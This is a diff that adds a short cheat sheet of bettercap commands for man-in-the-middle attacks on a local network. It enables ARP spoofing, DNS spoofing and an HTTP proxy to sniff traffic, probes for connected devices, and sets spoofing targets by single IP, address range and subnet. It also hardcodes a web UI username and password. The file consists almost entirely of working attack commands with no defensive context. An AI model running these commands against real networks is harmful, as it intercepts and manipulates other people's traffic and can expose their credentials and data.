@@ -1,0 +1,33 @@
+// launch bettercap (terminal)
+sudo bettercap -iface en0
+
+// launch ui
+ui on
+
+// set ui with auth
+set api.rest.username admin
+set api.rest.password soggih
+
+// turn on arp.spoof
+arp.spoof on
+
+// sniff traffic
+dns.spoof on
+http.proxy on
+
+// start network scan
+net.probe on
+
+// network scan without log
+set net.show.meta false
+
+// show list of connected devices
+net.show
+
+// set targets (specific, ip range, subnet)
+set arp.spoof.targets 192.168.1.100
+set arp.spoof.targets 192.168.1.1-192.168.1.254
+set arp.spoof.targets 100.97.0.0/24
+
+// get target
+get arp.spoof.targets
